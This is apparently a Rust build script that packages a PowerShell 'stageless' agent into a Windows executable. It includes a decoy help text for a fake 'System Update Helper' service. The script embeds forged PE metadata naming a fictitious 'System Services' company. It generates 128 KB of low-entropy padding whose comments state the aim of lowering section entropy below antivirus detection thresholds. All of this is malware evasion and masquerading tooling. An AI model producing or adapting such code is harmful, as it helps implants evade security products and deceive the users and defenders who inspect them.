fn gen_pad() -> Vec<u8> {
    // Natural-language content; entropy ~4.4 b/B — dilutes high-entropy .rodata sections.
    let text = b"System Update Helper - Service Infrastructure Module\r\n\
Version 2.1.4.0  System Services Group  Windows Platform Division\r\n\
\r\n\
Background maintenance operations: cache management, index synchronization,\r\n\
configuration reload, health verification, log rotation, resource cleanup.\r\n\
Runs as scheduled task or standalone service. No user interaction required.\r\n\
\r\n\
Supported operations: install  remove  check  update  verify  status  help\r\n\
\r\n\
Registry path: HKCU\\Software\\SystemServices\\UpdateHelper\r\n\
Parameters:\r\n\
  EnableScheduler      1 enabled  0 disabled  (default: 1)\r\n\
  LogLevel             0 silent  1 errors  2 warnings  3 verbose  (default: 1)\r\n\
  MaintenanceWindow    HH:MM-HH:MM format  empty string = always active\r\n\
  RetryCount           retries on transient failures  (default: 3)\r\n\
  TimeoutSeconds       per-operation timeout in seconds  (default: 30)\r\n\
  CacheDirectory       cache storage path  (default: local app data folder)\r\n\
  MaxLogSizeKB         log rotation threshold in kilobytes  (default: 512)\r\n\
  HeartbeatIntervalSec status reporting cadence in seconds  (default: 60)\r\n\
  StagingDirectory     temporary staging path  (default: system temp folder)\r\n\
  NetworkTimeoutSec    network operation timeout in seconds  (default: 15)\r\n\
  ProxyServer          optional HTTP proxy server address and port number\r\n\
  ProxyBypassList      semicolon-separated list of proxy bypass hostnames\r\n\
\r\n\
Exit codes: 0 success  1 failure  2 config-error  3 network-error  4 auth\r\n\
            5 timeout  6 privileges  7 resource-locked  8 disk-full  9 version\r\n\
\r\n\
Windows Event Log: Application log  Source: SystemServices.UpdateHelper\r\n\
  Event 1000  service started successfully\r\n\
  Event 1001  service stopped normally\r\n\
  Event 1002  configuration loaded and validated\r\n\
  Event 1003  maintenance cycle completed without errors\r\n\
  Event 1004  error occurred during maintenance cycle execution\r\n\
  Event 1005  network operation failed will retry on next cycle\r\n\
  Event 1006  retry attempt initiated for previously failed operation\r\n\
  Event 1007  operation timed out after configured interval expired\r\n\
  Event 1008  cache invalidated and rebuilt from source data\r\n\
  Event 1009  index synchronization completed without errors\r\n\
  Event 2000  scheduled task registered in Windows Task Scheduler\r\n\
  Event 2001  scheduled task removed from Windows Task Scheduler\r\n\
  Event 2002  scheduled task triggered by Task Scheduler engine\r\n\
  Event 2003  on-demand execution requested by authorized user\r\n\
\r\n\
Compatibility: Windows 8.1 and Windows Server 2012 R2 and later versions\r\n\
  PowerShell version 5.1 or later is required for PowerShell script mode\r\n\
  Microsoft .NET Framework version 4.5 or later is required\r\n\
  Minimum available disk space: 10 megabytes for service data and logs\r\n\
\r\n\
Diagnostics:\r\n\
  Enable verbose logging: set LogLevel to 3 in registry configuration\r\n\
  Log file: %LOCALAPPDATA%\\SystemServices\\Logs\\UpdateHelper.log\r\n\
  Configuration dump: execute binary with -config command line argument\r\n\
  Network connectivity test: execute binary with -nettest argument\r\n\
  Service status report: execute binary with -status command line argument\r\n\
";
    let src = text;
    // 128 KB: large enough to dilute .rdata section entropy by ~0.6 b/B
    // on a typical 100 KB stageless script.  Target: .rdata ≤ 5.5 b/B.
    let target: usize = 131072;
    let mut out = Vec::with_capacity(target);
    let mut i = 0usize;
    while out.len() < target {
        out.push(src[i % src.len()]);
        i += 1;
    }
    out
}

fn main() {
    let path = std::env::var("STRATUM_AGENT_PATH")
        .expect("STRATUM_AGENT_PATH must point to the rendered .ps1 file");
    println!("cargo:rerun-if-changed={}", path);
    println!("cargo:rerun-if-env-changed=STRATUM_AGENT_PATH");

    // Embed PE version resources so the binary has company/product metadata.
    if std::env::var("CARGO_CFG_TARGET_OS").as_deref() == Ok("windows") {
        let mut res = winres::WindowsResource::new();
        res.set("FileDescription",  "System Update Helper");
        res.set("ProductName",      "System Update Helper");
        res.set("CompanyName",      "System Services");
        res.set("LegalCopyright",   "Copyright \u{00a9} System Services");
        res.set("FileVersion",      "2.1.4.0");
        res.set("ProductVersion",   "2.1.4.0");
        res.set_version_info(winres::VersionInfo::FILEVERSION,    0x0002_0001_0004_0000);
        res.set_version_info(winres::VersionInfo::PRODUCTVERSION, 0x0002_0001_0004_0000);
        let _ = res.compile();
    }

    // Write low-entropy padding used by main.rs/lib.rs to dilute .rodata entropy.
    let out_dir = std::env::var("OUT_DIR").unwrap();
    std::fs::write(format!("{}/e.bin", out_dir), gen_pad())
        .expect("failed to write entropy pad");
}
